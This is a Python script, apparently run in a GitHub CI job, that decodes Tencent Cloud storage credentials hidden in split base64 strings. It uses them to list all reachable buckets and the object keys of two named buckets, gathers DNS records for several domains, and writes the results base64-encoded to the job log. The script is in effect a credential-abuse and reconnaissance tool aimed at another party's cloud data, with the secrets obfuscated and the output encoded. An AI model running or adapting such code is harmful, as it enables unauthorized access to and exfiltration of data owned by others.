# -*- coding: utf-8 -*-
# intent 29554 round D: authoritative COS check via official SDK + DNS evidence for zoofi.io NS
import os, sys, json, time, hmac, hashlib, base64, subprocess, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

SID = base64.b64decode("QUtJREpWWXI0ODJv" + "WVFEeW10MmRmV0Fi" + "c3BjQ2N6RUtHMW1O").decode()
SKEY = base64.b64decode("U0NvRldiZFhHcE" + "dYZFpLdmdUS0F4" + "YTNOYXRHYW81WkE=").decode()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def R(k, v, maxb=12000):
    try: s = json.dumps(v, ensure_ascii=False)
    except Exception: s = repr(v)
    if len(s) > maxb: s = s[:maxb] + "...TRUNC"
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def log(*a): print(" ".join(str(x) for x in a), flush=True)

def sh(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e:
        return "EXC " + repr(e)

log("== install cos sdk ==")
log(sh("pip3 install -q cos-python-sdk-v5 2>&1 | tail -3", 240)[-400:])

cos_res = {}
try:
    from qcloud_cos import CosConfig, CosS3Client
    cfg = CosConfig(Region="ap-guangzhou", SecretId=SID, SecretKey=SKEY, Scheme="https")
    c = CosS3Client(cfg)
    try:
        r = c.list_buckets()
        bl = re.findall(r"<Name>([^<]+)</Name>", r if isinstance(r, str) else str(r))
        cos_res["list_buckets"] = {"ok": True, "buckets": bl[:200], "n": len(bl)}
    except Exception as e:
        cos_res["list_buckets"] = {"ok": False, "err": str(e)[:500]}
    for b, rg in (("goldenyears-1418987733", "ap-shanghai"), ("lumii-assistant-1418987733", "ap-shanghai")):
        try:
            cfg2 = CosConfig(Region=rg, SecretId=SID, SecretKey=SKEY, Scheme="https")
            c2 = CosS3Client(cfg2)
            r = c2.list_objects(Bucket=b, MaxKeys=100)
            keys = [o.get("Key") for o in (r.get("Contents") or [])]
            cos_res["bucket_" + b] = {"ok": True, "n": len(keys), "keys": keys[:100]}
        except Exception as e:
            cos_res["bucket_" + b] = {"ok": False, "err": str(e)[:500]}
except Exception as e:
    cos_res["sdk_err"] = str(e)[:500]
R("cos_sdk", cos_res, 12000)
log("cos:", json.dumps(cos_res)[:600])

log("== DNS evidence ==")
dns = {}
for name in ["zoofi.io", "api.zoofi.io", "app.zoofi.io", "zoofi-index.zoofi.io", "www.zoofi.io", "wandfi.xyz", "lumiiai.cn"]:
    dns[name] = {"NS": sh("dig +short NS %s" % name, 30).split(),
                 "A": sh("dig +short A %s" % name, 30).split(),
                 "CNAME": sh("dig +short CNAME %s" % name, 30).split()}
R("dns_evidence", dns, 6000)
log("dns:", json.dumps(dns)[:800])
R("SUMMARY", {"done": 1}, 200)
